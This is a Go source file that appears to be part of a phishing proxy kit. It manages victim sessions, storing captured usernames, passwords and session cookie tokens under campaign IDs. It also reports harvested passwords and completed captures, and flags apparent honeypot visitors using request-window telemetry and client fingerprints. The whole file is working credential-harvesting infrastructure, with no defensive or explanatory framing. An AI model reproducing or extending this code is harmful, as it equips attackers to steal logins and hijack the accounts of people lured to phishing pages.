package main

import (
	"crypto/rand"
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"net/http"
	"strings"
	"sync"
	"time"
)

// ══════════════════════════════════════════════════════════
//  FIXED-SIZE SLIDING WINDOW (Zero-Allocation Telemetry)
//  Tracks behavioral metrics over a rolling 60-second window
//  without triggering the Go Garbage Collector.
// ══════════════════════════════════════════════════════════

const (
	bucketCount       = 12
	bucketWidthMS     = 5000
	sessionIdleTTL    = time.Hour
	sessionVisitParam = "data"
)

// RequestBucket holds aggregated stats for a 5-second window.
type RequestBucket struct {
	Epoch        int64
	RequestCount uint32
	ErrorCount   uint16
	PathHash     uint64
}

// RequestWindow is a FIXED-SIZE array. It never allocates new memory on the heap.
type RequestWindow struct {
	Buckets [bucketCount]RequestBucket
}

// Add records a request into the correct time bucket, overwriting old data.
func (w *RequestWindow) Add(nowMS int64, pathHash uint64, isError bool) {
	epoch := nowMS / bucketWidthMS
	index := int(epoch % bucketCount)

	bucket := &w.Buckets[index]
	if bucket.Epoch != epoch {
		bucket.Epoch = epoch
		bucket.RequestCount = 0
		bucket.ErrorCount = 0
		bucket.PathHash = 0
	}

	if bucket.RequestCount < ^uint32(0) {
		bucket.RequestCount++
	}
	if isError && bucket.ErrorCount < ^uint16(0) {
		bucket.ErrorCount++
	}
	bucket.PathHash = pathHash
}

// GetWindowStats sums up the last 60 seconds of activity.
func (w *RequestWindow) GetWindowStats(nowMS int64) (reqCount uint32, errCount uint16, uniquePaths uint8) {
	currentEpoch := nowMS / bucketWidthMS

	for i := 0; i < bucketCount; i++ {
		bucket := &w.Buckets[i]
		if currentEpoch-bucket.Epoch < bucketCount {
			reqCount += bucket.RequestCount
			errCount += bucket.ErrorCount
			if bucket.PathHash != 0 {
				uniquePaths++
			}
		}
	}
	return reqCount, errCount, uniquePaths
}

// ══════════════════════════════════════════════════════════
//  SESSION TRACKING
// ══════════════════════════════════════════════════════════

type Session struct {
	mu                  sync.Mutex
	ID                  string
	Index               int
	IP                  string
	UserAgent           string
	Username            string
	Password            string
	Domain              string
	TargetName          string
	CampaignID          string
	Fingerprint         string
	VisitKey            string
	CreatedAt           time.Time
	LastSeenAt          time.Time
	LandingPageServedAt time.Time
	IsDone              bool
	ReachedService      bool
	PasswordSent        bool
	sentPassword        string
	CompleteSent        bool
	CookieTokens        map[string]string
	IsHoneypot          bool
	ActivityWindow      RequestWindow
}

// SetCampaignID records the campaign once for this session.
func (s *Session) SetCampaignID(cid string) {
	cid = strings.TrimSpace(cid)
	if cid == "" {
		return
	}
	s.mu.Lock()
	defer s.mu.Unlock()
	if s.CampaignID == "" {
		s.CampaignID = cid
	}
}

func (s *Session) SetCredentials(username, password string) {
	s.mu.Lock()
	defer s.mu.Unlock()
	if username != "" {
		s.Username = username
	}
	if password != "" {
		s.Password = password
	}
}

func (s *Session) AddToken(name, value string) {
	s.mu.Lock()
	defer s.mu.Unlock()
	if s.CookieTokens == nil {
		s.CookieTokens = make(map[string]string)
	}
	s.CookieTokens[name] = value
}

func (s *Session) SetLandingPageServedAt() {
	s.mu.Lock()
	defer s.mu.Unlock()
	s.LandingPageServedAt = time.Now()
}

func (s *Session) GetLandingPageServedAt() time.Time {
	s.mu.Lock()
	defer s.mu.Unlock()
	return s.LandingPageServedAt
}

func (s *Session) ShouldEmitPassword(password string) bool {
	s.mu.Lock()
	defer s.mu.Unlock()
	if password == "" {
		return false
	}
	if s.PasswordSent && s.sentPassword == password {
		return false
	}
	s.PasswordSent = true
	s.sentPassword = password
	return true
}

func (s *Session) ShouldEmitComplete() bool {
	s.mu.Lock()
	defer s.mu.Unlock()
	if s.CompleteSent {
		return false
	}
	s.CompleteSent = true
	return true
}

func (s *Session) Snapshot() (username, password, campaignID string, tokens map[string]string, done bool) {
	s.mu.Lock()
	defer s.mu.Unlock()
	tokens = make(map[string]string, len(s.CookieTokens))
	for k, v := range s.CookieTokens {
		tokens[k] = v
	}
	return s.Username, s.Password, s.CampaignID, tokens, s.IsDone
}

// canReuse checks immutable/session-binding context before an existing cookie is
// allowed to select a Session. Missing context may be learned once; conflicting
// context always forces a new Session instead of mutating the existing one.
func (s *Session) canReuse(domain, fingerprint, visitKey, campaignID string, now time.Time) (bool, string) {
	s.mu.Lock()
	defer s.mu.Unlock()

	if normalizeSessionDomain(s.Domain) != normalizeSessionDomain(domain) {
		return false, "base domain changed"
	}

	lastSeen := s.LastSeenAt
	if lastSeen.IsZero() {
		lastSeen = s.CreatedAt
	}
	if !lastSeen.IsZero() && now.Sub(lastSeen) > sessionIdleTTL {
		return false, "session idle timeout"
	}

	if s.Fingerprint != "" && fingerprint != "" && s.Fingerprint != fingerprint {
		return false, "client fingerprint changed"
	}
	if s.VisitKey != "" && visitKey != "" && s.VisitKey != visitKey {
		return false, "visit marker changed"
	}
	if s.CampaignID != "" && campaignID != "" && s.CampaignID != campaignID {
		return false, "campaign changed"
	}

	if s.Fingerprint == "" && fingerprint != "" {
		s.Fingerprint = fingerprint
	}
	if s.VisitKey == "" && visitKey != "" {
		s.VisitKey = visitKey
	}
	if s.CampaignID == "" && campaignID != "" {
		s.CampaignID = campaignID
	}
	s.LastSeenAt = now
	return true, ""
}

type SessionManager struct {
	mu         sync.Mutex
	sessions   map[string]*Session
	byIndex    map[int]*Session
	nextID     int
	cookieName string
}

var sessionMgr *SessionManager

func initSessionManager() {
	b := make([]byte, 4)
	_, _ = rand.Read(b)

	sessionMgr = &SessionManager{
		sessions:   make(map[string]*Session),
		byIndex:    make(map[int]*Session),
		nextID:     0,
		cookieName: fmt.Sprintf("_%s", hex.EncodeToString(b)),
	}
}

func normalizeSessionDomain(domain string) string {
	return strings.Trim(strings.ToLower(strings.TrimSpace(domain)), ".")
}

func requestSessionFingerprint(r *http.Request) string {
	if r == nil {
		return ""
	}
	return strings.TrimSpace(r.Header.Get("X-CF-Fingerprint"))
}

func requestSessionCampaignID(r *http.Request) string {
	if r == nil || r.URL == nil {
		return ""
	}
	return strings.TrimSpace(r.URL.Query().Get("cid"))
}

// requestSessionVisitKey creates a non-reversible binding from the public visit
// marker. The raw marker is not stored in session memory.
func requestSessionVisitKey(r *http.Request) string {
	if r == nil || r.URL == nil {
		return ""
	}
	raw := strings.TrimSpace(r.URL.Query().Get(sessionVisitParam))
	if raw == "" {
		return ""
	}
	sum := sha256.Sum256([]byte(raw))
	return hex.EncodeToString(sum[:16])
}

func (sm *SessionManager) cleanupExpiredLocked(now time.Time) {
	for id, s := range sm.sessions {
		s.mu.Lock()
		lastSeen := s.LastSeenAt
		if lastSeen.IsZero() {
			lastSeen = s.CreatedAt
		}
		expired := !lastSeen.IsZero() && now.Sub(lastSeen) > sessionIdleTTL
		idx := s.Index
		s.mu.Unlock()

		if expired {
			delete(sm.sessions, id)
			delete(sm.byIndex, idx)
		}
	}
}

func (sm *SessionManager) createLocked(r *http.Request, domain, fingerprint, visitKey, campaignID string, now time.Time) *Session {
	id := sm.generateID()
	idx := sm.nextID
	sm.nextID++

	s := &Session{
		ID:             id,
		Index:          idx,
		IP:             extractIP(r),
		UserAgent:      r.UserAgent(),
		Domain:         normalizeSessionDomain(domain),
		CampaignID:     campaignID,
		Fingerprint:    fingerprint,
		VisitKey:       visitKey,
		CreatedAt:      now,
		LastSeenAt:     now,
		CookieTokens:   make(map[string]string),
		ActivityWindow: RequestWindow{},
	}

	sm.sessions[id] = s
	sm.byIndex[idx] = s

	ua := s.UserAgent
	if len(ua) > 50 {
		ua = ua[:50]
	}
	fmt.Printf("[+] [%d] New session: %s (%s) from %s\n", idx, s.ID[:8], ua, s.IP)
	return s
}

func (sm *SessionManager) GetOrCreate(r *http.Request, domain string) *Session {
	sm.mu.Lock()
	defer sm.mu.Unlock()

	now := time.Now()
	domain = normalizeSessionDomain(domain)
	fingerprint := requestSessionFingerprint(r)
	visitKey := requestSessionVisitKey(r)
	campaignID := requestSessionCampaignID(r)

	sm.cleanupExpiredLocked(now)

	cookie, err := r.Cookie(sm.cookieName)
	if err == nil && cookie.Value != "" {
		if s, ok := sm.sessions[cookie.Value]; ok {
			if reusable, reason := s.canReuse(domain, fingerprint, visitKey, campaignID, now); reusable {
				return s
			} else {
				fmt.Printf("[SESSION] Rotating session %s: %s\n", shortSessionID(s.ID), reason)
			}
		}
	}

	return sm.createLocked(r, domain, fingerprint, visitKey, campaignID, now)
}

func shortSessionID(id string) string {
	if len(id) <= 8 {
		return id
	}
	return id[:8]
}

func (sm *SessionManager) generateID() string {
	b := make([]byte, 16)
	_, _ = rand.Read(b)
	hash := sha256.Sum256(b)
	return hex.EncodeToString(hash[:])
}

// ══════════════════════════════════════════════════════════
//  IP EXTRACTION
// ══════════════════════════════════════════════════════════

func extractIP(r *http.Request) string {
	if ip := r.Header.Get("Cf-Connecting-Ip"); ip != "" {
		return ip
	}
	if ip := r.Header.Get("X-Forwarded-For"); ip != "" {
		return ip
	}
	host := r.RemoteAddr
	for i := len(host) - 1; i >= 0; i-- {
		if host[i] == ':' {
			return host[:i]
		}
	}
	return host
}
